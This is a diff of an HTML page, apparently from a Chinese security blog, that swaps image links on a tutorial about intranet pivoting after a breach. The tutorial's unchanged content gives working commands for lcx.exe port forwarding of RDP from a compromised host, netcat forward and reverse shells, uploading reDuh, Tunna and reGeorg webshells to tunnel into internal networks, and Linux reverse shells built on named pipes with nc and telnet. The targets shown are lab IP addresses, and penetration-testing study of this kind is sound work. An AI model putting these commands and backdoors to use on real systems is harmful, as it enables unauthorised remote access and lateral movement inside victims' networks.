@@ -3,56 +3,56 @@
 <p>lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的3389端口就相当于链接A机的3389。</p>
 <p>首先在本地进行监听，监听51端口并转发到33891端口</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen 51 33891</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/lcx1.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/lcx1.png" alt=""></p>
 <p>内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口</p>
 <p>将内网(192.168.1.128)的3389端口转发到公网(192.168.1.110)的51端口</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe –slave 192.168.1.110 51 192.168.1.128 3389</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/lcx2.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/lcx2.png" alt=""></p>
 <p>远程桌面访问33891端口</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/lcx3.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/lcx3.png" alt=""></p>
 <h2 id="NC转发"><a href="#NC转发" class="headerlink" title="NC转发"></a>NC转发</h2><p>本机：192.168.1.125<br>靶机：192.168.1.128</p>
-<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>在靶机上<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc1.png" alt=""></p>
-<p>在本机上操作，并成功获得一个远程机器的shell<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc2.png" alt=""></p>
-<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>在本机运行上<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc3.png" alt=""></p>
-<p>在远程机器上，然后成功之后，在本地机器上获得一个远程机器的cmdshell<br><img src="http://obr4sfdq7.bkt.clouddn.com/nc4.png" alt=""></p>
+<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>在靶机上<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc1.png" alt=""></p>
+<p>在本机上操作，并成功获得一个远程机器的shell<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc2.png" alt=""></p>
+<h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>在本机运行上<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc3.png" alt=""></p>
+<p>在远程机器上，然后成功之后，在本地机器上获得一个远程机器的cmdshell<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/nc4.png" alt=""></p>
 <h2 id="Redduh内网反弹"><a href="#Redduh内网反弹" class="headerlink" title="Redduh内网反弹"></a>Redduh内网反弹</h2><p>本机：192.168.1.110<br>靶机：192.168.1.128</p>
 <p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本地要安装jdk。</p>
 <p>这里我们以php网站为例，首先将php文件上传到服务器端。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/reDuh1.png" alt=""></p>
-<p>浏览器中访问上传的webshell，提示以下内容说明解析成功<br><img src="http://obr4sfdq7.bkt.clouddn.com/reDuh2.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reDuh1.png" alt=""></p>
+<p>浏览器中访问上传的webshell，提示以下内容说明解析成功<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reDuh2.png" alt=""></p>
 <p>用客户端连接服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar reDuhClient.jar http://192.168.1.125/reDuh.php</span><br></pre></td></tr></table></figure></p>
 <p>本地连接1010端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -vv localhost 1010</span><br><span class="line">[createTunnel]1235:127.0.0.1:3389</span><br></pre></td></tr></table></figure></p>
-<p>远程登录<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna3.png" alt=""></p>
+<p>远程登录<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna3.png" alt=""></p>
 <h2 id="Tunna内网反弹"><a href="#Tunna内网反弹" class="headerlink" title="Tunna内网反弹"></a>Tunna内网反弹</h2><p>靶机：192.168.1.137<br>本机：192.168.1.110</p>
-<p>以下为后门文件，该工具是Python所写，需要Python环境，同样有jsp、aspx、php版本的webshell<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna0.png" alt=""></p>
-<p>这里使用php网站进行测试，上传php后门<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna2.png" alt=""></p>
+<p>以下为后门文件，该工具是Python所写，需要Python环境，同样有jsp、aspx、php版本的webshell<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna0.png" alt=""></p>
+<p>这里使用php网站进行测试，上传php后门<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna2.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxy.py -u http://192.168.1.137/conn.php -l 1234 -r 3389 -v –s</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/tunna4.png" alt=""></p>
-<p>远程连接<br><img src="http://obr4sfdq7.bkt.clouddn.com/tunna3.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna4.png" alt=""></p>
+<p>远程连接<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tunna3.png" alt=""></p>
 <h2 id="Linux系统通过nc反弹shell"><a href="#Linux系统通过nc反弹shell" class="headerlink" title="Linux系统通过nc反弹shell"></a>Linux系统通过nc反弹shell</h2><p>本机：192.168.1.117<br>靶机：192.168.1.116</p>
 <p>首先，攻击端进行监听</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lvnp 2333</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc1.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc1.png" alt=""></p>
 <p>服务端执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p</span><br></pre></td></tr></table></figure></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.117 2333 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc3.png" alt=""></p>
-<p>执行命令，查看发现反弹成功<br><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc2.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc3.png" alt=""></p>
+<p>执行命令，查看发现反弹成功<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc2.png" alt=""></p>
 <h2 id="内置命令反弹"><a href="#内置命令反弹" class="headerlink" title="内置命令反弹"></a>内置命令反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lvnp 2333</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc1.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc1.png" alt=""></p>
 <p>服务器端执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p</span><br><span class="line">telnet 192.168.1.117 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc4.png" alt=""></p>
-<p>反弹成功<br><img src="http://obr4sfdq7.bkt.clouddn.com/linuxnc2.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc4.png" alt=""></p>
+<p>反弹成功<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/linuxnc2.png" alt=""></p>
 <h2 id="reGeorg-proxifier正向代理"><a href="#reGeorg-proxifier正向代理" class="headerlink" title="reGeorg+proxifier正向代理"></a>reGeorg+proxifier正向代理</h2><p>靶机：192.168.1.117<br>本机：192.168.1.110</p>
 <p>reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高一些。这也是平时用的比较多的工具。</p>
 <p>先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg1.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg1.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8888 -u http://192.168.1.117/tunnel.php</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg2.png" alt=""></p>
-<p>将proxifier打开，在Proxy Server中这样配置<br><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg22.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg2.png" alt=""></p>
+<p>将proxifier打开，在Proxy Server中这样配置<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg22.png" alt=""></p>
 <p>右击“mstsc.exe”，选择“proxifier”-》proxy socks5 127.0.0.1进行远程连接<br><img src="http://xianzhi.aliyun.com/forum/attachment/Mon_1703/4_1369089561206498_634c5121ba88660.jpg" alt=""></p>
 <p>输入内网ip，192.168.1.117</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg4.png" alt=""></p>
-<p>可以看到reGeorg的状态，和proxifier的状态<br><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg3.png" alt=""></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/reGeorg5.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg4.png" alt=""></p>
+<p>可以看到reGeorg的状态，和proxifier的状态<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg3.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/reGeorg5.png" alt=""></p>
 </div></article></div></section><footer><div class="paginator"><a href="/posts/skill/浅谈ddos的测试方法.html" class="prev">PREV</a><a href="/posts/notes/xss-payload-大全.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2018 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>
